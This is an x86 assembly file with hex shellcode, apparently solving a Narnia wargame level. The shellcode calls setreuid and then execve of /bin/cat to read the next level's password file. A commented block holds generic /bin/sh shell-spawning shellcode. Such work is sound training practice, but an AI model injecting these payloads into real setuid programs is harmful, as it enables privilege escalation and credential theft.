;Loading geteuid()
xor     eax,eax
mov     al,0x31
int     0x80

;Loading setreuid(euid,euid)
mov     ebx,eax
mov     ecx,eax
xor     eax,eax
mov     al,0x46
int     0x80

;Loading execve("/bin/cat",["/bin/cat","/etc/narnia_pass/narnia2"],NULL)
xor     eax,eax         ;making eax 0 (to be used as \0 pointer in stack to differentiate values)
push    eax
push    0x7461632F      ;tac/
push    0x6E69622F      ;nib/
mov     ebx,esp         ;pointing to /bin/cat
push    eax
push    0x3261696E      ;2ain
push    0x72616E2F      ;ran/
push    0x73736170      ;ssap
push    0x5F61696E      ;_ain
push    0x72616E2F      ;ran/
push    0x6374652F      ;cte/
mov     ecx,esp         ;pointing to /etc/narnia_pass/narnia2
push    eax             ;setting up execve()
push    ecx             ;push pointer to "/etc/narnia_pass/narnia2"
push    ebx             ;push pointer to "/bin/cat"
mov     ecx,esp         ;pointer to the argvs
xor     edx,edx         ;make env as NULL
mov     al,0xb          ;syscall 11 = execve
int     0x80

;;SHELLCODE OF THE ABOVE
; \x31\xC0\xB0\x31\xCD\x80\x89\xC3\x89\xC1\x31
; \xC0\xB0\x46\xCD\x80\x31\xC0\x50\x68\x2F\x63
; \x61\x74\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68
; \x6E\x69\x61\x32\x68\x2F\x6E\x61\x72\x68\x70
; \x61\x73\x73\x68\x6E\x69\x61\x5F\x68\x2F\x6E
; \x61\x72\x68\x2F\x65\x74\x63\x89\xE1\x50\x51
; \x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80

;;MISC
;Loading execve("/bin/sh",["/bin/sh"],NULL)
; xor     eax,eax         ;making eax 0 (to be used as NULL pointer in stack)
; push    eax
; push    0x68732f2f      ;pushing //sh in little endian order 
; push    0x6e69622f      ;pushing /bin in little endian order
; mov     ebx,esp         ;stack pointer stored in ebx   
; push    eax             ;setting up execve()
; push    ebx             ;push "/bin//sh"
; mov     ecx,esp         ;push ["/bin//sh"] as argv 
; xor     edx,edx         ;make env as NULL
; mov     al,0xb          ;syscall 11 = execve
; int     0x80